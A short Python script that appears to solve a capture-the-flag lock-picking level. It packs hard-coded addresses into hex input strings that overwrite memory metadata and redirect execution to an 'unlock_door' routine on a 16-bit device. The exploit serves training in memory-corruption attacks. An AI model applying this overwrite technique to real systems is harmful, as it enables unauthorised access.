import struct
def hex_to_str(s):
	return " ".join("{:02x}".format(ord(c)) for c in s)
	
def addr_to_hex(addr):
	return hex_to_str(struct.pack("H",addr))

user_len = 16
pass_len = 16

unlock_door_addr = 0x4564

address_to_overwrite=0x439a
val_at_over=0x4440

length = unlock_door_addr-6-val_at_over 

exploit_username = hex_to_str("A"*user_len) + " " + addr_to_hex(address_to_overwrite-4) + " " + addr_to_hex(0x4400) + " "+ addr_to_hex(length) 
exploit_password = addr_to_hex(unlock_door_addr)

print(exploit_username)

print(exploit_password)

